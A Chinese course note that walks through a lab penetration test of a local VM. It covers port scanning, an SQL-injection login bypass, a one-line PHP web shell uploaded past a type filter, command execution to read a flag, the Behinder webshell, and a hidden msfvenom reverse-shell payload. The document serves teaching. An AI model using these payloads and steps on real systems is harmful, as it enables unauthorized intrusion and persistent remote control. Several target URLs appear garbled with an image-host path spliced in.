---
title: 9.14 课程笔记
---

今天讲的是渗透以及漏洞利用相关的东西，大致理清楚了从开始查到到漏洞利用的整个过程。

## `nmap`, `fscan` - 寻找暴露端口

首先要先下载 `fscan` 软件，打开  GitHub 地址：

**[GitHub - shadow1ng/fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。(An intranet comprehensive scanning tool, enabling one-click automated, all-round vulnerability scanning) · GitHub](https://github.com/shadow1ng/fscan)**

找到 Release 页面，选择 Kali 适用版本

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note.webp)

在 Kali 中进行下载

```bash
wget -o- https://github.com/shadow1ng/fscan/releases/download/v2.2.1/fscan_2.2.1_linux_x64
```

使用 nmap 和 fscan 对主机暴露端口进行扫描

```bash
# nmap 扫描
nmap 192.168.235.130
# nmap 查看详细信息
	nmap -sV 192.168.235.130

# fscan 扫描
./fscan* -h 192.168.235.130
```

扫描完会返回端口扫描结果

```bash
└─$ nmap 192.168.235.130 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-15 01:02 -0400
Nmap scan report for 192.168.235.130
Host is up (0.0021s latency).
Not shown: 990 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8001/tcp open  vcom-tunnel
8002/tcp open  teradataordbms
8007/tcp open  ajp12
8008/tcp open  http
8009/tcp open  ajp13
8010/tcp open  xmpp
8011/tcp open  unknown
MAC Address: 00:0C:29:71:C1:AC (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.92 seconds
```

## 登录页面查找上传漏洞

打开8001端口页面

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-1.webp)

这里是一个登录界面，想要正常登录可以尝试 SQL 注入的 **[万能密码](https://zhuanlan.zhihu.com/p/487217582)**

```text
username: admin 'or' 1=1 #
password: 随意
```

成功登录，进入系统

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-2.webp)

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-3.webp)

登录后浏览整个系统，找到这这样一个可以上传的地方

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-4.webp)

也就是说，这个是这个网页唯一的攻击入口，我们现在就是要想办法往里面上传木马。我记得我之前写过，我们可以尝试去上传木马 php 文件进行执行，所以需要先编写，php 木马病毒

```php
<?php system($_GET[1]); ?>
```

将其写入一个 php 文件内，下面就是想办法上传，先选择我们写的这个文件

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-5.webp)

但是网站报了一个错误，无法上传，如果我们想要能够上传这个，就要想办法把这个识别给破掉，所以需要用到 `Brup Suit` 工具。

打开浏览器后找到 `Proxy` 菜单

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-6.webp)

打开 `Intercept` 开启抓包

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-7.webp)

重新上传

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-8.webp)

拦截到上传的地方，发现了允许类型与现在的类型，我们现在需要对上传的类型进行更改，以绕过拦截

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-9.webp)

更改后发现依然报错，然后尝试这个类型

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-10.webp)

这样就更新成功

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-11.webp)

打开网页

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-12.webp)

没有报 404 错误，尝试去访问

```text
http://192.168.235.130:8001/https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/images/avatars/1.php?1=ls
```

可以得到下面的结果

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-13.webp)

去根目录找找

```bash
http://192.168.235.130:8001/https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/images/avatars/1.php?1=ls /
```

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-14.webp)

看见了 `flag.txt` ，打开看看

```text
http://192.168.235.130:8001/https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/images/avatars/1.php?1=cat /flag.txt
```

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-15.webp)

即可获取 flag

## WebShell

既然存在上传漏洞接口，我们就可以使用 WebShell 对靶机进行控制，WebShell 有很多，课上使用的是冰蝎，所以就使用这个。

打开下载地址：[Release Behinder_v4.1【t00ls专版】 · rebeyond/Behinder · GitHub](https://github.com/rebeyond/Behinder/releases/tag/Behinder_v4.1%E3%80%90t00ls%E4%B8%93%E7%89%88%E3%80%91)

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-16.webp)

需要将这个 `zip` 压缩包下载下来

```bash
wget -o- https://github.com/rebeyond/Behinder/releases/download/Behinder_v4.1%E3%80%90t00ls%E4%B8%93%E7%89%88%E3%80%91/Behinder_v4.1.t00ls.zip
```

解压缩可以得到这些文件

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-17.webp)

server 目录下就是需要上传到被控靶机的东西

我们需要先将客户端运行起来

```bash
java -jar Behinder.jar
```

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-18.webp)

依旧是按照之前步骤上传 WebShell 的 server 文件上去

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-19.webp)

选择 shell 的 php 脚本

上传完成后在客户端内连接

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-20.webp)

连接后即可访问，但是在 `whami` 当中可以看到权限是 `www`

## 生成攻击木马

如果想要进行提权，我们就需要查找靶机底层的漏洞，我们需要查看靶机的系统信息

```text
http://192.168.235.130:8001/https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/images/avatars/2.php?1=uname \-a
```

![](https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/9-14-course-note-21.webp)

生成攻击木马脚本

```bash
msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.235.129 -f elf -o /home/kali/Desktop/test.elf
```

上传后进行重名

```text
http://192.168.235.130:8001/https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/images/avatars/2.php?1=mv test.elf .svc
```

运行后即可查看连接

```text
http://192.168.235.130:8001/https://pic.ivoinkwell.xyz/file/docs/cybersecurity-and-data-security/9-14-course-note/images/avatars/2.php?1=chmod +x ./.svc && nohup ./.svc >/dev/null 2>&1 &
```

